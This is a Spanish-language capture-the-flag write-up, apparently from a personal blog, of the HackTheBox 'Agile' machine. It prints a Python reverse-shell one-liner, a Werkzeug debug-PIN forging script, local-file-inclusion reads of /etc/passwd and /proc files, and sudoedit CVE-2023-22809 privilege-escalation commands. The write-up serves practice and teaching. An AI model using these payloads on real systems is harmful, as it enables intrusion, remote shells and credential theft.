<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"> <title>HTB - Agile &#8211; Al3xt0r</title> <meta name="description" content=""> <meta name="keywords" content="CTF, HTB, Linux, Medium"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="prof.jpeg"> <meta name="twitter:title" content="HTB - Agile"> <meta name="twitter:description" content=""> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="HTB - Agile"> <meta property="og:description" content=""> <meta property="og:url" content="http://localhost:4000/HTB-Agile/"> <meta property="og:site_name" content="Al3xt0r"> <meta property="og:image" content="http://localhost:4000/images/prof.jpeg"> <link rel="canonical" href="http://localhost:4000/HTB-Agile/"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Feed --> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="" /> <!-- Favicons --> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- CSS --> <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css"> <!-- Left Block Image for Posts --> <style type="text/css"> #posts.inner-post-page .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/bk3.jpg) no-repeat;background-size: cover;} </style> <!-- Left Block Images for Home and Pages --> <style type="text/css"> #posts .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/images/kg-ali.jpg) no-repeat;background-size: cover, cover;} .block-left {background: linear-gradient(rgba(44,45,51,0.9), rgba(44,45,51,0.9)), url(http://localhost:4000/images/bk2.jpeg) no-repeat;background-size: cover;} </style> </head> <body id="posts" class="inner-post-page"> <div class="block-left"> <div class="content"> <a href="http://localhost:4000" class="logo"><img src="http://localhost:4000/images/prof.jpeg"></a> <div class="post-title-section"> <div class="section-line">Posts <em>/</em></div> <h1 class="section-title">HTB - Agile </h1> <ul class="tags"> <li><a href="http://localhost:4000/tags#CTF">CTF</a></li> <li><a href="http://localhost:4000/tags#HTB">HTB</a></li> <li><a href="http://localhost:4000/tags#Linux">Linux</a></li> <li><a href="http://localhost:4000/tags#Medium">Medium</a></li> </ul> <div class="section-line reverse"><a href="http://localhost:4000/posts">Back to posts</a> <em>/</em></div> </div> </div> </div> <div class="block-right"> <div class="share-buttons"> </div> <a href="../posts.html" title="posts" class="posts-menu-icon"></a> <a title="projects" class="projects-menu-icon"> <span></span> </a> <div class="inner-post content"> <div class="date-highlight">04 Aug 2023</div> <h2 id="analisis">Analisis:</h2> <p>Esta machine es de dificultad <strong>Medium</strong>, Sistema Operativo <strong>Linux</strong> <img src="/assets/img/HTB_Agile/A0.png" alt="" /></p> <h4 id="nota">Nota:</h4> <p>Hicieron una actualizacion que evita un <strong>“leak”</strong> de los usuarios en una vulnerabilidad del codigo:</p> <p><img src="/assets/img/HTB_Agile/A1.png" alt="" /></p> <h3 id="reconocimiento">Reconocimiento:</h3> <p>Vamos a ver los <strong>puertos abiertos</strong> del servidor, al igual que ver la version de las tecnologias que se usan detras:</p> <p>Para hacer esto usaremos los comandos:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-T5</span> <span class="nt">--open</span> &lt;IP de la maquina&gt;
</code></pre></div></div> <p>O si queremos ir mas rapido e ir de forma silenciosa:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> 65535 <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> &lt;IP de la maquina&gt;
</code></pre></div></div> <p>Una vez obtenidos los puertos abiertos, usaremos herramientas de reconocimiento:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p</span>&lt;Puertos&gt; &lt;IP de la Maquina&gt;
</code></pre></div></div> <p>Una vez ejecutados los comandos, veremos los puertos:</p> <ul> <li>22, Perteneciente al servicio SSH, y vemos que es un servidor <strong>UBUNTU</strong></li> <li>80, Perteneciente al servicio HTTP</li> </ul> <p>Si tiramos un script de reconocimiento web a nivel de consola, podremos ver que se ejecuta un redirect a un dominio <strong>superpass.htb</strong></p> <p><img src="/assets/img/HTB_Agile/A2.png" alt="" /></p> <p>Para, arreglar esto, vamos a tirar del virtual hosting, esto se hace agregando la ip y seguido, la redireccion al dominio correspondiente:</p> <p><img src="/assets/img/HTB_Agile/A3.png" alt="" /></p> <p>Vemos un servicio que nos permite logearnos y registarse, asi que lo hacemos y veremos que se trata de un gestor de passwords: <img src="/assets/img/HTB_Agile/A4.png" alt="" /></p> <p>Registramos un usuario y vemos que se emplea un menu de gestion de passwords:</p> <p>Como vemos, tenemos un boton de <strong>EXPORT</strong>, este hace la accion de descargarnos un archivo <strong>.CSV</strong>, por lo que interceptaremos la peticion con nuestra herramienta de confianza: <strong>burpsuite</strong></p> <p>Vemos que existe una peticion de un archivo que se crea, para que luego te permita descargarlo: <img src="/assets/img/HTB_Agile/A5.png" alt="" /> Si interceptamos la peticion, podremos ver un parametro <strong>fn</strong></p> <p><img src="/assets/img/HTB_Agile/A6.png" alt="" /> Podemos ver un <strong>LFI</strong>: <img src="/assets/img/HTB_Agile/A7.png" alt="" /></p> <p>Ahora bien, forzaremos un error para ver los mensajes que nos retorna el servidor: Si vemos bien, la aplicacion fuerza un <strong>debugger</strong> y vemos que parece mostrar un parametro llamativo: <strong>cmd=resource</strong> <img src="/assets/img/HTB_Agile/A8.png" alt="" /></p> <p><img src="/assets/img/HTB_Agile/A9.png" alt="" /> Si vemos, este error permite activar el debugger… Y abrir una “terminal”” desde la pagina, pero nos pedira un <strong>PIN</strong>, por lo que aqui entra una vulnerabilidad del modo debug.</p> <ul> <li>Si vemos, se usa Python 3.10</li> <li>Emplea <strong>flask</strong> y podemos ver la ruta de la <strong>app.py</strong></li> <li>Vemos que tiene el modo <strong>debug</strong> activo</li> </ul> <p>Si quieres tener un poco mas detallado esto, te sugiero que entres al siguiente enlace:</p> <ul> <li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">HackTricks</a></li> </ul> <h3 id="obteniendo-el-pin">Obteniendo el PIN</h3> <p>Para explotar esta vulnerabilidad, tendremos que asegurarnos de tener los siguientes datos:</p> <ul> <li>El modo debug esta <strong>activo</strong> (✓)</li> <li>Username: En este caso es <strong>www-data</strong>, que obtenemos al apuntar al /etc/passwd (✓)</li> <li>“modname”, en este caso es <strong>flask.app</strong> (✓)</li> <li>El nombre de la APP es: <strong>“wsgi_app”</strong> (✓)</li> <li>“uuid.getnode”, Este tendremos que obtenerlo</li> <li>“machine.id()”, el ID de la maquina, tambien tendremos que obtenerlo</li> </ul> <h4 id="obteniendo-el-uuidgetnode">Obteniendo el uuid.getnode</h4> <p>Si leemos la documentacion de <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">HackTricks</a>, nos indica que primero tendremos que obtener la interfaz de red, apuntando al binario del sistema <strong>/proc/net/arp</strong></p> <p><img src="/assets/img/HTB_Agile/A10.png" alt="" /></p> <p>Una vez obtenida la interfaz de red: <strong>eth0</strong>, vamos a apuntar a la direccion: <strong>sys/class/net/&lt;device id&gt;/address</strong> <img src="/assets/img/HTB_Agile/A11.png" alt="" /> Por lo que nos quedaria transformar esa direccion <strong>hexagesimal</strong> al sistema decimal, esto lo podemos hacer con Python:</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span><span class="p">(</span><span class="mi">0</span><span class="n">x</span><span class="o">&lt;</span><span class="n">Direccion</span><span class="o">&gt;</span><span class="p">)</span>
</code></pre></div></div> <p><img src="/assets/img/HTB_Agile/A12.png" alt="" /></p> <h4 id="obteniendo-el-machine-id">Obteniendo el Machine ID:</h4> <p>Para esto, apuntamos a la ruta: <strong>/proc/sys/kernel/random/boot_id</strong> <img src="/assets/img/HTB_Agile/A13.png" alt="" /></p> <h3 id="obteniendo-el-pin-1">Obteniendo el Pin:</h3> <p>Si nos guiamos del codigo brindado por la misma documentacion de HackTricks:</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">'web3_user'</span><span class="p">,</span><span class="c"># username</span>
    <span class="s">'flask.app'</span><span class="p">,</span><span class="c"># modname</span>
    <span class="s">'Flask'</span><span class="p">,</span><span class="c"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
    <span class="s">'/usr/local/lib/python3.5/dist-packages/flask/app.py'</span> <span class="c"># getattr(mod, '__file__', None),</span>
<span class="p">]</span>

<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">'UUID'</span><span class="p">,</span><span class="c"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
    <span class="s">'MACHINE ID'</span><span class="c"># get_machine_id(), /etc/machine-id</span>
<span class="p">]</span>

<span class="c">#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0</span>
<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">()</span>
<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
        <span class="k">continue</span>
    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">b</span><span class="s">'cookiesalt'</span><span class="p">)</span>
<span class="c">#h.update(b'shittysalt')</span>

<span class="n">cookie_name</span> <span class="o">=</span> <span class="s">'__wzd'</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>

<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">b</span><span class="s">'pinsalt'</span><span class="p">)</span>
    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s">'</span><span class="si">%09</span><span class="s">d'</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>

<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">rv</span> <span class="o">=</span> <span class="s">'-'</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
            <span class="k">break</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>

<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
</code></pre></div></div> <p>Tendriamos que ejecutarlo con nuestros parametros y obtener el codigo <strong>PIN</strong>, para habilitar la consola en el modo <strong>debug</strong>, dentro de la pagina.</p> <p>Procedemos a ver si podemos ejecutar comandos de forma remota y de paso a asegurar si podemos efectuar conexiones remotas: <img src="/assets/img/HTB_Agile/A14.png" alt="" /> <img src="/assets/img/HTB_Agile/A15.png" alt="" /></p> <p>Como podemos comprobar que si, vamos a tirarnos una reverse shell:</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">socket</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">();</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">""</span><span class="p">,</span><span class="mi">1234</span><span class="p">));[</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="n">f</span><span class="p">)</span><span class="k">for</span> <span class="n">f</span> <span class="ow">in</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)];</span><span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"sh"</span><span class="p">)</span>
</code></pre></div></div> <p><img src="/assets/img/HTB_Agile/A16.png" alt="" /> <img src="/assets/img/HTB_Agile/A17.png" alt="" /></p> <p>Viendo conexiones, podemos toparnos con un servicio <strong>MySql</strong>, asi que iremos a buscar archivos que nos interesen… Vemos que existe un directorio <strong>app</strong> dentro de la raiz del sistema, donde encontraremos las credenciales para logearnos al servicio MySQL</p> <p><img src="/assets/img/HTB_Agile/A18.png" alt="" /></p> <p>Si analizamos la Database: <strong>SUPERPASS</strong>, podemos encontrarnos con los usuarios y las passwords hasheadas:</p> <p><img src="/assets/img/HTB_Agile/A19.png" alt="" /></p> <p>Una vez obtenemos las credenciales del usuario: <strong>CORUM</strong>, entramos por SSH <img src="/assets/img/HTB_Agile/A20.png" alt="" /> Si vemos el estado de la red nos toparemos con un puerto interesante, el <strong>41829</strong> (Un puerto usado por Google Chrome) <img src="/assets/img/HTB_Agile/A21.png" alt="" /></p> <p>Solo nos quedaria hacer port forwarding a nuestra maquina, podemos usar <strong>CHISEL</strong>, pero yo lo hare con SSH <img src="/assets/img/HTB_Agile/A22.png" alt="" /></p> <p>Si recordamos, cuando hicimos un LFI, dentro del error, podiamos ver el codigo de la app, dentro de esta existe un error que retorna la password del usuario:</p> <p><img src="/assets/img/HTB_Agile/A23.png" alt="" /></p> <p>Si usamos el propio <strong>Google Chrome</strong> para efectuar el port forwarding, veremos lo siguiente: <img src="/assets/img/HTB_Agile/A24.png" alt="" /> Por lo que vemos que hay un dominio <strong>test.superpass.htb</strong>, atentamos el codigo defectuoso con el que nos topamos y obtendremos la clase del usuario <strong>edwards</strong> <img src="/assets/img/HTB_Agile/A25.png" alt="" /> <img src="/assets/img/HTB_Agile/A26.png" alt="" /></p> <p>Ahora, si buscamos privilegios a nivel de <strong>SUDOERS</strong>, nos toparemos con lo siguiente: <img src="/assets/img/HTB_Agile/A27.png" alt="" /></p> <p>Si buscamos algun exploit con el binario <strong>“sudoedit”</strong>, nos toparemos con el <strong>[CVE-2023-22809]</strong>, este nos indica que necesitaremos una variable de entorno… Por lo que usaremos la herramienta <strong>PSPY64</strong> para hallarla.</p> <p><img src="/assets/img/HTB_Agile/A28.png" alt="" /></p> <p>Por lo que nos quedaria explotar esto a nuestro favor usando:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">EDITOR</span><span class="o">=</span><span class="s2">"vim -- /app/venv/bin/activate"</span>
</code></pre></div></div> <p>Seguido de:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> dev_admin sudoedit /app/config_test.json 
</code></pre></div></div> <p><img src="/assets/img/HTB_Agile/A29.png" alt="" /></p> <p>Le asignamos permisos a la bash y con esto concluiriamos la machine.</p> <p><img src="/assets/img/HTB_Agile/A30.png" alt="" /></p> <p><img src="/assets/img/HTB_Agile/A31.png" alt="" /></p> <h2 id="fin">FIN</h2> <br> <nav class="pagination"> <a href="http://localhost:4000/HTB-TwoMillion/" class="pagination_pager" title="HTB - TwoMillion ">previous</a> <a href="http://localhost:4000/HTB-Forest/" class="pagination_pager" title="HTB - Forest ">next</a> </nav> </div> </div> <!-- JS --> <script src="http://localhost:4000/assets/js/main.min.js"></script> <div class="overlay"> <ul class="projects-menu"> <li style="background:url(https://user-images.githubusercontent.com/86735230/184715052-062e79fd-d01b-4148-b5d2-7e64878d1f50.png) center center no-repeat;"> <a href="http://github.com/SirDext3r/JavascriptRandomizeArt" target="_blank" rel="nofollow external"> <span> Geometry Art </span> </a> </li> </ul> </div> </body> </html>
